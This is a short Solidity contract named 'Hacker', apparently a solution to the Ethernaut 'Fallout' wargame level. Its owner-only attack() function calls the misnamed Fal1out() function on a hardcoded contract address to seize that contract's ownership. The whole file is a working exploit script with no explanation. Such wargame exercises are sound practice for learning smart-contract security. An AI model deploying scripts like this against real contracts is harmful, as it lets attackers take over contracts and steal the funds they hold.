// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

interface FalloutInterface {
  function Fal1out() external payable;
}

contract Hacker {
  address payable public hacker;

  constructor() {
    hacker = payable(msg.sender);
  }

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }
//address _target
  function attack() external onlyHacker {
    // 0. Get the target contract.
    FalloutInterface falloutInstance = FalloutInterface(0x1F89b5E75B37b583fFD627cCeE1aEBAECE4F2Ca8);

    // 1. Call fallout function
    falloutInstance.Fal1out();
  }
}